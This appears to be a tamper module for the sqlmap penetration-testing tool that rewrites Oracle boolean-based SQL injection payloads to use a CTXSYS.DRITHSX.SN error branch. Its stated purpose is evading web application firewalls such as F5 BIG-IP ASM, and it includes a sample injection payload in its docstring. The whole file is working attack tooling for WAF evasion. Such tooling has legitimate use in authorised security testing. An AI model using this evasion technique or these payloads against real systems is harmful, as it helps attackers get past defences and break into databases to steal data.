#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on Ghauri techniques - https://github.com/r0oth3x49/ghauri

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces Oracle CASE WHEN style with CTXSYS.DRITHSX.SN for boolean-based WAF bypass

    Requirement:
        * Oracle DBMS

    Tested against:
        * F5 BIG-IP ASM
        * WAFs blocking standard CASE/THEN/ELSE patterns

    Notes:
        * Converts: THEN 1 ELSE 0 END) FROM DUAL)=1
        * To: THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL
        * Uses Oracle's CTXSYS error to differentiate true/false
        * Based on Ghauri's CTXSYS.DRITHSX.SN technique

    Reference:
        * https://github.com/r0oth3x49/ghauri

    >>> tamper("(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)=1")
    "(SELECT (CASE WHEN (1=1) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL"
    """
    if not payload:
        return payload

    retVal = payload

    # Replace Oracle CASE WHEN ... THEN 1 ELSE 0 END with CTXSYS version
    # Ghauri uses CTXSYS.DRITHSX.SN to cause error on false branch
    retVal = re.sub(
        r'THEN\s+1\s+ELSE\s+0\s+END(\s+FROM\s+DUAL)?',
        r'THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END\1',
        retVal,
        flags=re.IGNORECASE
    )

    # Replace )=1 with ) IS NULL when using CTXSYS (trailing =1 comparison)
    if 'CTXSYS.DRITHSX.SN' in retVal:
        retVal = re.sub(r'\)\s*=\s*1(?=\s*($|--))', ') IS NULL', retVal)

    return retVal
